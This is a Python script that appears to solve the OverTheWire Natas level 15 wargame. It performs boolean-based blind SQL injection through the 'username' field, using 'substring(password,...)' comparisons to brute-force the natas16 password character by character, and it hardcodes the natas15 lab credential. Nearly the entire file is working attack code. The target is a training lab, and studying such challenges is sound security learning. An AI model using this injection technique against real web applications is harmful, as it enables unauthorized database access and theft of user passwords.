import requests
import string
from html.parser import HTMLParser

class MyHTMLParser(HTMLParser):
    printContent = False
    returnedResponse = ""
    def handle_starttag(self, tag, attrs):
        if(tag != "div"): return
        for key, value in attrs:
            if (key == "id" and value == "content"):
                self.printContent = True

    def handle_data(self, data):
        if(self.printContent): 
            self.returnedResponse = data
            self.printContent = False

username = "natas15"
pwd = "GB6USCJYJjwLyYhZUNkE1NwDueiTow6g"
CREDENTIALS = (username, pwd)
API_URL = f"http://{username}.natas.labs.overthewire.org"

success_text = "This user exists."

# Combine digits, lowercase letters, and uppercase letters
char_list = list(string.digits + string.ascii_letters)

guessed_pwd = ""

print("[!] Brute force started ")
with requests.Session() as session:
    # Set Basic Auth at the session level (applies to all requests automatically)
    session.auth = CREDENTIALS

    for i in range(1, len(pwd) + 1): # assuming the password for each user is the same length
        response = ""
        MATCH_FOUND = False
        for char in char_list: # proceed guessing the next character
            try:
                # Crafting next SQL query
                query = f'natas16" AND BINARY substring(password,1,{str(i)}) = "{guessed_pwd}{char}" -- '
                r = session.post(API_URL, data={"username": query})

                r.raise_for_status()

                if (r.status_code == 200):
                    html_text = r.content.decode('utf-8')
                    parser = MyHTMLParser()
                    parser.feed(html_text)
                    response = parser.returnedResponse.strip()
                else:
                    print(f"[!] Something went wrong! Request Status: {r.status_code}") 

                # Increment the index so the loop moves to the next character
                if response == success_text:
                    guessed_pwd += char
                    print(f"[+] Progress: {guessed_pwd} ({i}/{len(pwd)})")
                    MATCH_FOUND = True
                    break    
            except requests.exceptions.HTTPError as err:
                print(f"HTTP Error for query: {err}")
            except requests.exceptions.RequestException as e:
                print(f"Connection error: {e}")

        if not MATCH_FOUND:
            print("\n[-] No matching character found, stopping.")
            break   
         
    print("\n[!] End of loop")
    print(f"Guessed password: {guessed_pwd}")



